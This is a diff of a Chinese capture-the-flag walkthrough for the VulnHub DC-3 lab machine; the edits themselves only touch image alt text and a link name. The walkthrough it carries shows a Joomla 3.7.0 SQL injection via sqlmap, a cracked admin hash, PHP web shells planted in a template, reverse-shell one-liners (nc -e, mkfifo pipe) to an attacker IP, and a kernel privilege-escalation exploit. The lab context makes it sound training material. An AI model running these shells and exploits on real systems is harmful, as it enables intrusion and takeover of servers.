@@ -61,7 +61,7 @@ Installation is simple - download it, unzip it, and then import it into VirtualB
 nmap -sP 192.168.141.0/24
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/1.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/1.png)
 
 排除法,去掉自己、宿主机、网关, `192.168.141.138` 就是目标了
 
@@ -70,11 +70,11 @@ nmap -sP 192.168.141.0/24
 nmap -T5 -A -v -p- 192.168.141.138
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/2.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/2.png)
 
 发现只开放一个 80 端口,那么就只能从这入手了，访问 web 发现，是一个 joomla 网站
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/3.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/3.png)
 
 dirhunt 目录扫描看看
 ```
@@ -82,7 +82,7 @@ pip3 install dirhunt
 dirhunt http://192.168.141.138/
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/4.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/4.png)
 
 没啥有用的东西,用 joomscan 试试,这个是 OWASP 的一个专门扫描 Joomla 漏洞的工具
 
@@ -94,7 +94,7 @@ cd joomscan
 perl joomscan.pl -u http://192.168.141.138/
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/5.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/5.png)
 
 没有啥东西，不过起码告诉了我版本是 3.7.0
 
@@ -107,7 +107,7 @@ perl joomscan.pl -u http://192.168.141.138/
 searchsploit -w Joomla 3.7.0
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/15.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/15.png)
 
 Joomla 3.7.0 有个 CVE-2017-8917 SQL 注入漏洞，更多漏洞信息和 POC 见 [Web_CVE漏洞记录](../../../笔记/RedTeam/Web_CVE漏洞记录.md#Joomla)
 
@@ -118,7 +118,7 @@ sqlmap -u "http://192.168.141.138/index.php?option=com_fields&view=fields&layout
 
 一路 y 就行了，可以看到跑出了后台账号密码
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/6.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/6.png)
 
 ```
 | admin | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu |
@@ -130,11 +130,11 @@ echo "\$2y\$10\$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu" > hash.tx
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=bcrypt
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/7.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/7.png)
 
 ok,跑出密码 `snoopy` ,登录,注意不是在 `http://192.168.141.138/index.php` 登录，而是在 `http://192.168.141.138/administrator/index.php` 登录，这 TM 才是后台
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/8.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/8.png)
 
 是时候拿个 shell 玩玩了
 
@@ -142,7 +142,7 @@ ok,跑出密码 `snoopy` ,登录,注意不是在 `http://192.168.141.138/index.p
 
 访问 `http://192.168.141.138/administrator/index.php?option=com_templates&view=templates`
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/9.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/9.png)
 
 这里随便找一个模板，我就用 Beez3 了，看它不爽
 
@@ -151,11 +151,11 @@ ok,跑出密码 `snoopy` ,登录,注意不是在 `http://192.168.141.138/index.p
 system($_GET['cmd']);
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/10.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/10.png)
 
 尝试访问模板预览 `http://192.168.141.138/index.php?tp=1&templateStyle=4&cmd=whoami`
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/11.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/11.png)
 
 ok，命令成功执行，下面直接准备回弹 shell
 
@@ -166,7 +166,7 @@ nc -lvp 4444
 
 访问 `http://192.168.141.138/index.php?tp=1&templateStyle=4&cmd=nc%20-nv%20192.168.141.134%204444%20-e%20/bin/bash`
 
-等待了半天,没弹回来,什么鬼,换个回弹方法试试,回弹方法见 [后渗透笔记](../../../笔记/RedTeam/后渗透笔记.md#linux下获取shell) linux 下获取 shell 部分
+等待了半天,没弹回来,什么鬼,换个回弹方法试试,回弹方法见 [后渗透](../../../笔记/RedTeam/后渗透.md#linux下获取shell) linux 下获取 shell 部分
 
 注: 这里试了半天,用了很多方法都没有回弹成功,只好暂时另辟蹊径了
 
@@ -175,25 +175,25 @@ nc -lvp 4444
 <?php eval($_POST[1]);?>
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/12.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/12.png)
 
 使用蚁剑连接
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/13.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/13.png)
 
 连上去了,手动在弹个 shell 回来
 ```bash
 nc -nv 192.168.141.134 4444 -e /bin/bash
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/17.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/17.png)
 
 谜题解开了,这 TM 是 openbad版本的 nc,我不管,老子就是要弹
 ```
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.141.134 4444 >/tmp/f
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/18.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/18.png)
 
 狗日的，还不是被我连上了,改下交互,查看版本
 ```bash
@@ -201,7 +201,7 @@ lsb_release -a
 uname -a
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/14.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/14.png)
 
 ---
 
@@ -212,7 +212,7 @@ uname -a
 searchsploit -w ubuntu 16.04 4.4.x
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/16.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/16.png)
 
 存在提权漏洞 CVE-2016-4557
 
@@ -235,8 +235,8 @@ cd ebpf_mapfd_doubleput_exploit && sh compile.sh
 ./doubleput
 ```
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/19.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/19.png)
 
 提权成功,感谢靶机作者 @DCUA7,查看最终 flag
 
-![image](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/20.png)
+![](../../../../../assets/img/安全/实验/VulnHub/DC/DC3/20.png)
